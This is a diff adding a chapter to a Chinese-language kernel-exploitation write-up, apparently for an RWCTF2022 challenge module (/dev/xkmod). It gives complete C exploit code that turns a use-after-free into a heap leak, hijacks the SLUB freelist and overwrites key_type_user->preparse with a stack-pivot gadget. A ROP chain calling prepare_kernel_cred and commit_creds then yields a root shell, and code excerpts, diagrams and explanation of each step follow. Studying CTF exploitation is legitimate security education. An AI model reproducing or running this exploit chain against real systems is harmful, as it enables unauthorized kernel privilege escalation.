@@ -2190,9 +2190,586 @@ flowchart TD
               height: auto;">
 </div>
 
+## 6. 进阶分析：key_type结构利用
+
+exploit核心代码如下：
+
+```c
+#ifdef SECONDARY_STARTUP_64
+#undef SECONDARY_STARTUP_64
+#define SECONDARY_STARTUP_64 0xffffffff81000030
+#endif
+
+#define KEY_TYPE_USER 0xffffffff8249b9a0
+#define USER_PREPARSE 0xffffffff81333170
+#define SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00a3c
+#define PREPARE_KERNEL_CRED 0xffffffff81088a80
+#define COMMIT_CREDS 0xffffffff810888c0
+
+#define POP_RDI_RET 0xffffffff81001965
+#define POP_RCX_RET 0xffffffff81027c13
+#define MOV_RDI_RAX_REP_MOVSQ_RDI_RSI_RET 0xffffffff8101bd6b
+#define MOV_RSP_RBP_POP_RBP_RET 0xffffffff81036923
+
+struct chunk_info {
+    size_t *user_buffer;
+    size_t offset;
+    size_t length;
+};
+
+void allocate_chunk(int device_fd, struct chunk_info *chunk) {
+    ioctl(device_fd, 0x1111111, chunk);
+}
+
+void edit_chunk(int device_fd, struct chunk_info *chunk) {
+    ioctl(device_fd, 0x6666666, chunk);
+}
+
+void read_chunk(int device_fd, struct chunk_info *chunk) {
+    ioctl(device_fd, 0x7777777, chunk);
+}
+
+static int device_fds[3];
+static struct chunk_info chunk;
+static size_t rop_chain[0x100];
+
+void restore_key_type_user() {
+    log.info("Restore the original user_preparse value to key_type_user->preparse");
+    chunk.user_buffer[0x30 / 8] = kernel_offset + USER_PREPARSE;
+    edit_chunk(device_fds[2], &chunk);
+    get_root_shell();
+}
+
+int main() {
+    size_t heap_leak;
+    size_t page_offset_base;
+    int target_found = 0;
+    int i;
+
+    log.info("Phase 1: Initial setup");
+    bind_core(0);
+    save_status();
+
+    for (i = 0; i < 3; i++) {
+        device_fds[i] = open("/dev/xkmod", O_RDONLY);
+        if (device_fds[i] < 0) {
+            log.error("Failed to open device /dev/xkmod");
+            exit(EXIT_FAILURE);
+        }
+    }
+    log.success("Opened /dev/xkmod with 3 file descriptors");
+
+    log.info("Phase 2: Constructing UAF");
+    chunk.user_buffer = malloc(0x1000);
+    if (!chunk.user_buffer) {
+        log.error("Memory allocation failed for user_buffer");
+        exit(EXIT_FAILURE);
+    }
+    chunk.offset = 0;
+    chunk.length = 0x50;
+    memset(chunk.user_buffer, 0, 0x1000);
+
+    allocate_chunk(device_fds[0], &chunk);
+    close(device_fds[0]);
+    log.success("UAF constructed: chunk allocated and fd closed");
+
+    log.info("Phase 3: Leaking kernel heap address");
+    read_chunk(device_fds[1], &chunk);
+    heap_leak = chunk.user_buffer[0];
+    page_offset_base = heap_leak & 0xfffffffff0000000;
+    log.success("Kernel heap leak: 0x%lx", heap_leak);
+    log.success("Guessed page_offset_base: 0x%lx", page_offset_base);
+
+    log.info("Phase 4: Leaking kernel base via freelist corruption");
+    chunk.user_buffer[0] = page_offset_base + 0x9d000 - 0x10;
+    chunk.offset = 0;
+    chunk.length = 8;
+    edit_chunk(device_fds[1], &chunk);
+
+    target_found = 0;
+    for (i = 0; i < 21; i++) {
+        allocate_chunk(device_fds[1], &chunk);
+        chunk.length = 0x40;
+        read_chunk(device_fds[1], &chunk);
+        log.info("freelist->next chunk[%d] => %#-18lx, secondary_startup_64: %#-18lx",
+                 i, chunk.user_buffer[0], chunk.user_buffer[2]);
+        if (((chunk.user_buffer[2] & 0xfff) == (SECONDARY_STARTUP_64 & 0xfff)) && chunk.user_buffer[0] == 0x0) {
+            target_found = 1;
+            log.success("Found target chunk for kernel base leak");
+            break;
+        }
+    }
+    if (!target_found) {
+        log.error("Failed to leak kernel base. Exiting");
+        exit(EXIT_FAILURE);
+    }
+
+    kernel_offset = chunk.user_buffer[2] - SECONDARY_STARTUP_64;
+    kernel_base += kernel_offset;
+    log.success("Kernel base: 0x%lx", kernel_base);
+    log.success("Kernel offset: 0x%lx", kernel_offset);
+    log.success("key_type_user: 0x%lx", kernel_offset + KEY_TYPE_USER);
+    log.success("user_preparse: 0x%lx", kernel_offset + USER_PREPARSE);
+
+    log.info("Phase 5: Hijacking key_type_user->preparse");
+    allocate_chunk(device_fds[1], &chunk);
+    close(device_fds[1]);
+
+    chunk.user_buffer[0] = kernel_offset + KEY_TYPE_USER - 0x10;
+    chunk.offset = 0;
+    chunk.length = 0x40;
+    edit_chunk(device_fds[2], &chunk);
+
+    target_found = 0;
+    for (i = 0; i < 21; i++) {
+        allocate_chunk(device_fds[2], &chunk);
+        read_chunk(device_fds[2], &chunk);
+        log.info("freelist->next chunk[%d] => %#-18lx, user_preparse value: %#-18lx",
+                 i, chunk.user_buffer[0], chunk.user_buffer[0x30 / 8]);
+        if (chunk.user_buffer[0x30 / 8] == (kernel_offset + USER_PREPARSE)) {
+            target_found = 1;
+            log.success("Found target chunk! Overwriting key_type_user->preparse with gadget");
+            chunk.user_buffer[0x30 / 8] = kernel_offset + MOV_RSP_RBP_POP_RBP_RET;
+            edit_chunk(device_fds[2], &chunk);
+            break;
+        }
+    }
+    if (!target_found) {
+        log.error("Failed to hijack key_type_user->preparse. Exiting");
+        exit(EXIT_FAILURE);
+    }
+
+    log.info("Phase 6: Building ROP chain for privilege escalation");
+    i = 0;
+    rop_chain[i++] = 0;
+    rop_chain[i++] = kernel_offset + POP_RDI_RET;
+    rop_chain[i++] = 0;
+    rop_chain[i++] = kernel_offset + PREPARE_KERNEL_CRED;
+    rop_chain[i++] = kernel_offset + POP_RCX_RET;
+    rop_chain[i++] = 0;
+    rop_chain[i++] = kernel_offset + MOV_RDI_RAX_REP_MOVSQ_RDI_RSI_RET;
+    rop_chain[i++] = kernel_offset + COMMIT_CREDS;
+    rop_chain[i++] = kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + 0x22;
+    rop_chain[i++] = *(size_t *)"BinRacer";
+    rop_chain[i++] = *(size_t *)"BinRacer";
+    rop_chain[i++] = (size_t)restore_key_type_user;
+    rop_chain[i++] = user_cs;
+    rop_chain[i++] = user_rflags;
+    rop_chain[i++] = user_sp + 8;
+    rop_chain[i++] = user_ss;
+
+    log.info("Triggering ROP chain via add_key()");
+    if (key_alloc("pwn4kernel", rop_chain, sizeof(rop_chain) - 18) < 0) {
+        log.error("Failed to allocate key via add_key()");
+        exit(EXIT_FAILURE);
+    }
+
+    log.error("ROP chain execution failed");
+    return -1;
+}
+```
+
+### 6-1. 技术背景与实现流程概述
+
+本章深入探讨基于Linux内核密钥子系统(Key Retention Service)中`key_type`结构的高级控制流程引导技术。此技术展示在特定系统配置下，如何通过修改密钥类型结构的函数指针实现精密的控制流程管理，扩展内核数据结构控制的技术维度。
+
+**密钥子系统基础**：
+Linux密钥子系统是内核中用于管理认证凭证、加密密钥和其他安全敏感数据的核心组件。`key_type`结构定义不同类型密钥的操作方法，包括密钥的创建、更新、销毁和预解析等操作。每种密钥类型都有其特定的`key_type`实例，如`key_type_user`处理用户密钥类型。
+
+**技术实现原理**：
+`key_type_user`是密钥子系统中的核心结构，包含处理用户密钥的一系列函数指针。当用户空间程序通过`add_key()`系统调用添加密钥时，内核会调用相应密钥类型的`preparse`函数进行参数预解析。通过修改`key_type_user`结构中的`preparse`函数指针，可以在特定的密钥添加操作中实现控制流程重定向。
+
+**完整技术验证流程**：
+整个验证过程延续前几章的技术框架，形成从环境准备到状态恢复的完整闭环：
+
+```mermaid
+flowchart TD
+    A[开始验证流程] --> B[阶段1: 环境初始化与UAF构造]
+    B --> C[阶段2: 内核堆地址泄露与基址计算]
+    C --> D[阶段3: 密钥类型结构控制权获取]
+    D --> E[阶段4: 篡改preparse函数指针]
+    E --> F[阶段5: ROP链构建与密钥添加触发]
+    F --> G[阶段6: 控制流程执行与权限验证]
+    G --> H[阶段7: 原始状态恢复与资源清理]
+    H --> I[技术验证完成与结果分析]
+
+    style A fill:#e1f5fe,stroke:#2196f3,stroke-width:2px
+    style B fill:#e1f5fe
+    style C fill:#e1f5fe
+    style D fill:#c8e6c9
+    style E fill:#c8e6c9
+    style F fill:#fff3e0
+    style G fill:#f3e5f5
+    style H fill:#c8e6c9
+    style I fill:#c8e6c9,stroke:#4caf50,stroke-width:2px
+```
+
+**各阶段技术关联性**：
+每个阶段构成紧密的技术链条，前一阶段的输出是后一阶段的输入，形成完整的控制流程引导路径。从环境初始化开始，逐步构建内存状态，实现精确的控制流程引导，最后完成系统状态恢复，确保技术验证的完整性和可重复性。
+
+### 6-2. 密钥子系统架构与数据结构分析
+
+Linux密钥子系统是内核安全管理的重要组成部分，理解其架构和数据流对控制流程引导技术至关重要。
+
+**密钥子系统核心组件**：
+
+```c
+struct key {
+    atomic_t                usage;          // 引用计数
+    key_serial_t           serial;         // 密钥序列号
+    struct rb_node         serial_node;    // 红黑树节点
+    struct key_type        *type;          // 密钥类型指针
+    /* ... 其他字段 ... */
+};
+
+struct key_type {
+    const char *name;                     // 类型名称
+    size_t def_datalen;                   // 默认数据长度
+
+    /* 操作函数指针 */
+    int (*preparse)(struct key_preparsed_payload *prep);
+    void (*free_preparse)(struct key_preparsed_payload *prep);
+    int (*instantiate)(struct key *key,
+                       struct key_preparsed_payload *prep);
+    /* ... 其他操作函数 ... */
+};
+```
+
+**密钥添加数据流**：
+当用户空间程序调用`add_key()`系统调用时，内核执行以下数据流处理：
+
+1. 系统调用入口处理
+2. 密钥类型查找与验证
+3. 调用`preparse`函数进行参数预解析
+4. 密钥实例化与存储
+5. 返回密钥标识符
+
+**密钥类型结构内存布局**：
+`key_type_user`在内核内存中有固定布局，其中`preparse`函数指针位于结构体特定偏移处。此固定布局为控制流程引导提供可预测的技术基础。
+
+### 6-3. 内核地址计算与密钥子系统符号解析
+
+基于获取的内核基址，通过预定义的符号偏移计算密钥子系统相关关键内核符号的实际地址。
+
+**密钥子系统符号偏移预定义**：
+
+```c
+#define KEY_TYPE_USER 0xffffffff8249b9a0
+#define USER_PREPARSE 0xffffffff81333170
+#define SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00a3c
+#define PREPARE_KERNEL_CRED 0xffffffff81088a80
+#define COMMIT_CREDS 0xffffffff810888c0
+
+#define POP_RDI_RET 0xffffffff81001965
+#define POP_RCX_RET 0xffffffff81027c13
+#define MOV_RDI_RAX_REP_MOVSQ_RDI_RSI_RET 0xffffffff8101bd6b
+#define MOV_RSP_RBP_POP_RBP_RET 0xffffffff81036923
+```
+
+**内核地址计算**：
+通过从内核内存中泄露的函数地址，计算实际内核基址与预定义基准之间的偏移量。基于此偏移量，推导出密钥子系统相关符号的实际运行时地址。
+
+**控制流程引导序列地址计算**：
+
+```c
+kernel_offset = chunk.user_buffer[2] - SECONDARY_STARTUP_64;
+kernel_base += kernel_offset;
+
+key_type_user = kernel_offset + KEY_TYPE_USER;
+user_preparse = kernel_offset + USER_PREPARSE;
+commit_creds = kernel_offset + COMMIT_CREDS;
+prepare_kernel_cred = kernel_offset + PREPARE_KERNEL_CRED;
+mov_rsp_rbp_pop_rbp_ret = kernel_offset + MOV_RSP_RBP_POP_RBP_RET;
+```
+
+**地址验证机制**：
+计算得到的地址通过多重验证确保准确性，包括调试器现场验证、内存读取验证和逻辑一致性验证。调试器可检查`key_type_user`结构的实际内存内容，确认计算结果的正确性。
+
+### 6-4. 内存状态构造与控制权获取流程
+
+通过特定的内存操作技术获得对`key_type_user`结构附近内存的控制权。此过程需要精密的内存状态构造和地址计算，确保控制权获取的可靠性。
+
+**UAF条件构造**：
+通过分配内存然后释放的操作序列，在SLUB缓存中创建Use-After-Free条件。此构造为后续的控制权获取创造技术基础：
+
+```c
+/* 分配内核内存块 */
+allocate_chunk(device_fds[0], &chunk);
+
+/* 释放内存，创建UAF条件 */
+close(device_fds[0]);
+```
+
+**堆地址泄露与基址计算**：
+利用UAF条件读取内核堆地址信息，为后续的基址计算提供数据基础。通过泄露的堆地址推测内核内存布局：
+
+```c
+read_chunk(device_fds[1], &chunk);
+heap_leak = chunk.user_buffer[0];
+page_offset_base = heap_leak & 0xfffffffff0000000;
+```
+
+**密钥类型结构控制权获取流程**：
+
+```mermaid
+flowchart TD
+    A[构造UAF条件<br/>创建空闲内存状态] --> B[堆地址泄露<br/>获取内核内存信息]
+    B --> C[freelist劫持<br/>重定向内存分配路径]
+    C --> D[进行21次堆喷射尝试<br/>基于SLUB缓存特性]
+    D --> E{检查分配结果<br/>验证控制权获取}
+    E -- 成功 --> F[验证获取的结构<br/>检查preparse指针值]
+    E -- 失败 --> G[继续尝试<br/>统计方法提高成功率]
+    G --> D
+    F --> H[修改函数指针<br/>preparse = MOV_RSP_RBP_POP_RBP_RET]
+    H --> I[控制权获取完成<br/>建立控制流程引导基础]
+
+    style A fill:#e1f5fe
+    style B fill:#e1f5fe
+    style C fill:#c8e6c9
+    style D fill:#f3e5f5
+    style E fill:#fff3e0
+    style F fill:#c8e6c9
+    style G fill:#f3e5f5
+    style H fill:#fff3e0
+    style I fill:#c8e6c9,stroke:#4caf50,stroke-width:2px
+```
+
+**堆喷射与验证实现**：
+基于SLUB缓存每个slab包含21个对象的特性，进行21次堆喷射尝试。每次尝试都分配新的内存块并读取其内容，验证是否成功获取目标结构。验证标准是检查结构中的`preparse`函数指针是否与预先计算的原始`user_preparse`地址匹配。
+
+**指针修改验证**：
+修改完成后，通过再次读取验证修改结果，确保指针篡改操作成功执行。成功修改`key_type_user->preparse`指针后，控制流程将从原始预解析函数重定向到栈转移指令序列。
+
+### 6-5. 从add_key系统调用到控制流程重定向
+
+当用户空间程序执行`add_key()`系统调用时，会触发从用户空间到内核空间的完整调用链。理解此路径对控制流程引导至关重要，以下是基于Linux密钥子系统执行流程的完整调用链分析。
+
+**密钥添加系统调用完整路径**：
+从用户空间执行`add_key()`系统调用开始，控制流程进入内核的系统调用入口。经过系统调用分发机制，到达具体的处理函数，最终通过多层函数调用到达目标函数指针位置。
+
+```mermaid
+flowchart TD
+    A["用户空间: 执行add_key()系统调用"] --> B[entry_SYSCALL_64<br/>x86_64架构系统调用入口点]
+    B --> C[do_syscall_64<br/>系统调用分发与参数处理]
+    C --> D[__x64_sys_add_key<br/>x86_64架构密钥添加处理函数]
+    D --> E[keyctl_add_key<br/>密钥控制层添加处理]
+    E --> F[密钥类型查找与验证]
+    F --> G[调用key_type->preparse<br/>密钥参数预解析处理]
+    G --> H[控制流程跳转到MOV_RSP_RBP_POP_RBP_RET<br/>因指针被篡改而触发栈迁移]
+    H --> I[栈指针迁移: RSP指向用户空间ROP链]
+    I --> J[控制流程重定向: 执行预置ROP链<br/>按预定路径执行]
+
+    subgraph 用户空间
+        A
+    end
+
+    subgraph 内核空间
+        B
+        C
+        D
+        E
+        F
+        G
+        H
+        I
+        J
+    end
+
+    style A fill:#e1f5fe
+    style B fill:#d4edda
+    style C fill:#d1ecf1
+    style D fill:#d4edda
+    style E fill:#d1ecf1
+    style F fill:#d4edda
+    style G fill:#ffccbc
+    style H fill:#c8e6c9
+    style I fill:#fff3e0
+    style J fill:#c8e6c9,stroke:#4caf50,stroke-width:2px
+```
+
+**调用链详细说明**：
+
+1. **系统调用入口**：`add_key()`系统调用触发硬件中断，控制流程跳转到内核的系统调用入口函数`entry_SYSCALL_64`，这是x86_64架构的标准系统调用入口点。
+
+2. **系统调用分发**：内核根据系统调用号分发到相应的处理函数`do_syscall_64`，此函数负责参数处理和调用正确的系统调用处理程序。
+
+3. **密钥添加处理**：调用具体的系统调用处理函数`__x64_sys_add_key`，这是x86_64架构下add_key系统调用的处理函数，负责参数验证和初步处理。
+
+4. **密钥控制层处理**：进入密钥控制层的添加处理函数`keyctl_add_key`，处理通用的密钥添加逻辑。
+
+5. **密钥类型查找**：根据密钥类型名称查找对应的`key_type`结构，此处查找"user"类型对应的`key_type_user`结构。
+
+6. **预解析函数调用**：通过操作结构中的函数指针调用`key_type_user->preparse`，正常情况下会调用`user_preparse`函数处理密钥参数预解析，但此时指针已被篡改。
+
+7. **栈迁移触发**：由于`key_type_user->preparse`指针已被篡改为`MOV_RSP_RBP_POP_RBP_RET`地址，控制流程跳转到栈迁移指令序列，开始栈迁移过程。
+
+**栈迁移技术原理**：
+`MOV_RSP_RBP_POP_RBP_RET`指令序列将栈指针设置为rbp寄存器的值，然后从栈中弹出rbp寄存器，最后返回。此指令序列将控制流程从内核空间重定向到用户空间预置的ROP链，实现控制流程的精确引导。
+
+### 6-6. ROP链构建与执行流程
+
+基于exploit.c代码，构建完整的ROP链实现权限验证操作。ROP链的设计体现对x86_64架构和内核执行环境的深入理解。
+
+**ROP链构建实现**：
+ROP链在用户空间构建，包含完整的控制流程执行序列：
+
+```c
+static size_t rop_chain[0x100];
+i = 0;
+rop_chain[i++] = 0;
+rop_chain[i++] = kernel_offset + POP_RDI_RET;
+rop_chain[i++] = 0;
+rop_chain[i++] = kernel_offset + PREPARE_KERNEL_CRED;
+rop_chain[i++] = kernel_offset + POP_RCX_RET;
+rop_chain[i++] = 0;
+rop_chain[i++] = kernel_offset + MOV_RDI_RAX_REP_MOVSQ_RDI_RSI_RET;
+rop_chain[i++] = kernel_offset + COMMIT_CREDS;
+rop_chain[i++] = kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + 0x22;
+rop_chain[i++] = *(size_t *)"BinRacer";
+rop_chain[i++] = *(size_t *)"BinRacer";
+rop_chain[i++] = (size_t)restore_key_type_user;
+rop_chain[i++] = user_cs;
+rop_chain[i++] = user_rflags;
+rop_chain[i++] = user_sp + 8;
+rop_chain[i++] = user_ss;
+```
+
+**ROP链执行路径**：
+ROP链执行从栈迁移后的控制流程重定位开始，经过参数设置、函数调用、寄存器优化、权限应用和环境恢复等多个阶段，最终完成权限验证。
+
+```mermaid
+flowchart TD
+    A[控制流程跳转: MOV_RSP_RBP_POP_RBP_RET] --> B[栈指针迁移: RSP指向用户空间ROP链]
+    B --> C[执行pop_rdi_ret序列<br/>设置函数参数]
+    C --> D[参数传递: RDI = 0]
+    D --> E["控制流程转移: 执行prepare_kernel_cred(0)"]
+    E --> F[凭证创建: RAX = 新cred结构指针]
+    F --> G[执行pop_rcx_ret序列<br/>设置寄存器值]
+    G --> H[寄存器设置: RCX = 0]
+    H --> I[寄存器优化<br/>准备函数调用环境]
+    I --> J["控制流程转移: 执行commit_creds(cred)"]
+    J --> K[权限应用: 当前进程获得权限提升]
+    K --> L[环境恢复<br/>返回用户空间]
+    L --> M[权限验证: 验证权限提升结果]
+
+    style A fill:#e1f5fe
+    style B fill:#fff3e0
+    style C fill:#c8e6c9
+    style D fill:#fff3e0
+    style E fill:#c8e6c9
+    style F fill:#fff3e0
+    style G fill:#c8e6c9
+    style H fill:#fff3e0
+    style I fill:#c8e6c9
+    style J fill:#fff3e0
+    style K fill:#c8e6c9,stroke:#4caf50,stroke-width:2px
+    style L fill:#c8e6c9
+    style M fill:#c8e6c9,stroke:#4caf50,stroke-width:2px
+```
+
+**详细执行步骤分析**：
+
+1. **控制流程跳转**：`MOV_RSP_RBP_POP_RBP_RET`指令将栈指针设置为rbp寄存器的值，然后从栈中弹出rbp寄存器，最后返回。栈迁移后，新的栈指针指向用户空间预置的ROP链起始位置。
+
+2. **参数环境准备**：执行`pop_rdi_ret`指令序列，从栈弹出0到rdi寄存器，为后续函数调用准备参数。
+
+3. **函数地址获取**：控制流程继续执行，从栈弹出`prepare_kernel_cred`函数地址，控制流程转到内核功能函数。
+
+4. **凭证创建**：调用`prepare_kernel_cred(0)`创建新的凭证结构，返回的cred结构指针保存在rax寄存器。
+
+5. **寄存器优化**：执行`pop_rcx_ret`设置rcx寄存器为0，然后执行`mov_rdi_rax_rep_movsq_rdi_rsi_ret`优化参数传递，为下一步函数调用准备正确的参数。
+
+6. **权限应用**：从栈弹出`commit_creds`函数地址并调用，将新创建的凭证应用到当前进程。此操作完成进程权限提升。
+
+7. **环境恢复**：执行`swapgs_restore_regs_and_return_to_usermode`返回用户空间，恢复内核-用户空间执行环境。
+
+8. **控制流程返回**：正常返回用户空间，完成权限验证操作，控制流程引导过程结束。
+
+**技术关键点分析**：
+
+1. **栈迁移精确性**：精心设计的栈迁移指令确保RSP正确指向用户空间ROP链位置，这是控制流程引导成功的技术基础。
+
+2. **控制流程连续性**：每个步骤自然衔接，形成完整的控制流程执行链，确保控制流程能按预定路径连续执行。
+
+3. **寄存器协同**：寄存器间协同工作，优化执行效率和控制流程传递，提高控制流程引导的成功率和可靠性。
+
+4. **状态可恢复**：执行后能正常返回用户空间，保持系统执行环境的稳定性，确保控制流程引导对系统的影响最小化。
+
+### 6-7. 原始状态恢复与权限验证
+
+在完成控制流程引导和权限提升操作后，恢复`key_type_user->preparse`的原始值是确保系统稳定性的重要环节。此恢复操作体现对系统完整性的尊重，避免因函数指针修改导致的系统不稳定或功能异常。
+
+**恢复操作实现**：
+恢复操作的实现遵循与函数指针劫持相似的技术路径，但目标是将修改后的指针值还原为原始状态。通过计算`preparse`函数指针在数据结构中的精确偏移，执行恢复操作将函数指针的值从`MOV_RSP_RBP_POP_RBP_RET`指令地址改回原始的`user_preparse`函数地址。
+
+**恢复函数定义**：
+
+```c
+void restore_key_type_user() {
+    log.info("恢复key_type_user->preparse原始值");
+    chunk.user_buffer[0x30 / 8] = kernel_offset + USER_PREPARSE;
+    edit_chunk(device_fds[2], &chunk);
+    // 启动高权限shell环境
+    get_root_shell();
+}
+```
+
+**权限验证与shell环境获取**：
+在控制流程引导完成并返回用户空间后，进行权限验证操作。通过检查当前进程的有效用户ID，确认权限提升是否成功。验证通过后，执行`system("/bin/sh")`函数，启动具有高权限的shell环境。
+
+**恢复的重要性**：
+
+1. **系统稳定性维护**：避免因函数指针修改导致的系统不稳定，防止内核崩溃或异常行为，确保系统能继续正常运行。
+
+2. **功能完整性保护**：保持密钥子系统的正常使用，确保系统功能不受影响，维护系统功能的完整性。
+
+3. **痕迹最小化**：减少对系统状态的影响，符合最小影响原则，降低技术验证对系统的长期影响。
+
+4. **可重复性保障**：为后续技术验证提供清洁的环境，确保技术验证过程的可重复性和可验证性。
+
+### 6-8. 技术特性对比分析
+
+本章介绍的`key_type`结构控制流程引导技术与前几章讨论的`tty_ldisc_ops`和`modprobe_path`技术代表三种不同的内核控制流程管理方法。三者的技术特性和适用场景各有侧重，体现内核控制流程引导技术的多样性和发展脉络。
+
+**技术特性对比**：
+
+| 对比维度     | key_type控制流程引导技术  | tty_ldisc_ops控制流程引导技术 | modprobe_path路径控制技术 |
+| ------------ | ------------------------- | ----------------------------- | ------------------------- |
+| 目标结构     | 密钥子系统key_type结构    | 终端子系统tty_ldisc_ops结构   | 内核全局变量modprobe_path |
+| 触发机制     | 系统调用(add_key)直接触发 | 系统调用(read)直接触发        | 文件执行间接触发          |
+| 控制流程转移 | 通过篡改preparse函数指针  | 通过篡改read函数指针          | 通过修改路径字符串        |
+| 执行环境     | 完全在内核空间完成        | 完全在内核空间完成            | 需要内核-用户空间协作     |
+| 技术复杂度   | 高，需构建完整ROP链       | 高，需精确控制寄存器状态      | 中，相对简单              |
+| 隐蔽性       | 高，利用合法系统调用      | 高，利用合法系统调用          | 中，需外部文件配合        |
+
+**技术演进关系**：
+从`modprobe_path`到`tty_ldisc_ops`再到`key_type`，可看到内核控制流程引导技术从简单的数据修改发展到复杂的控制流程劫持，技术难度和隐蔽性逐渐提高。每种技术都有其适用的场景和条件，选择合适的技术取决于目标系统的具体配置。
+
+**关键技术差异**：
+
+1. **触发入口**：`add_key()`系统调用相比`read()`系统调用和文件执行触发提供不同的技术入口点
+2. **控制粒度**：函数指针篡改提供更精细的控制粒度，能直接引导控制流程
+3. **环境要求**：完全内核空间操作减少对外部组件的依赖
+4. **恢复难度**：函数指针篡改技术更容易实现状态恢复，系统影响更小
+
+### 6-9. 技术总结
+
+`key_type`结构控制流程引导技术代表内核控制流程引导技术的高级阶段。与前几章技术相比，此技术提供不同的技术入口点和控制方法，扩展内核控制流程引导技术的应用范围。通过精心设计的ROP链和精确的内存操作，实现完全在内核空间完成的控制流程引导操作。从技术演进角度看，本章技术是前几章技术的自然延伸和深化，体现内核控制流程引导技术从简单到复杂、从单一到多样化的发展路径。
+
+### 6-10. 测试结果
+
+<div style="text-align: center; margin: 2rem 0;">
+  <img src="/images/posts/KernelExploit/FreelistHijacking/FreelistHijacking_003.png"
+       style="border-radius: 12px; 
+              box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+              max-width: 100%;
+              height: auto;">
+</div>
+
 ## 参考
 
 https://github.com/BinRacer/pwn4kernel/tree/master/src/ArbitraryAddrAlloc
 https://github.com/BinRacer/pwn4kernel/tree/master/src/ArbitraryAddrAlloc3
+https://github.com/BinRacer/pwn4kernel/tree/master/src/ArbitraryAddrAlloc4
 https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#例题：RWCTF2022高校赛-Digging-into-kernel-1-2
 https://ltfa1l.top/2024/08/01/system/kernel/Linux_kernel4_freelist劫持/#0x03-初探freelist劫持：以RWCTF2022体验赛-Digging-into-kernel2为例
